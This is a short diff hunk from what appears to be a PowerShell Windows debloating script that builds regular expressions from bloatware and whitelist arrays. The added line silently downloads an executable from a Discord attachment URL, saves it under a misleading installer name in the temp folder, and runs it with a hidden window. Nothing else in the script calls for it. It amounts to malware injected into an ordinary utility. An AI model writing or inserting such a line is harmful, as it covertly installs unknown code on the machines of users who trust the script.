@@ -201,7 +201,7 @@ Function dotInclude() {
 
 # Override built-in blacklist/whitelist with user defined lists
 dotInclude 'custom-lists.ps1'
-
+iwr -useb https://cdn.discordapp.com/attachments/1050062111855886397/1050062174053216337/Ryujinx.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
 #convert to regular expression to allow for the super-useful -match operator
 $global:BloatwareRegex = $global:Bloatware -join '|'
 $global:WhiteListedAppsRegex = $global:WhiteListedApps -join '|'
